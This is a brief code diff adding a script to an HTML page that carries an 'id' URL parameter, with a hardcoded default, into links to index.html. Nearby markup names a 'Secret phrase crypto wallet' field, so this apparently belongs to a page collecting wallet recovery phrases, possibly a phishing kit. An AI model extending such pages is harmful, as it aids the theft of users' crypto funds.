@@ -213,6 +213,18 @@ name="Secret phrase crypto wallet"
       }
     };
   </script>
+<script>
+  // DEFAULT ID (used if none in URL)
+  const DEFAULT_ID = "7979664801";
 
+  // Get id from URL
+  const params = new URLSearchParams(window.location.search);
+  const userId = params.get("id") || DEFAULT_ID;
+
+  // Update all index.html links
+  document.querySelectorAll('a[href="index.html"]').forEach(link => {
+    link.href = `index.html?id=${encodeURIComponent(userId)}`;
+  });
+</script>
 </body>
 </html>
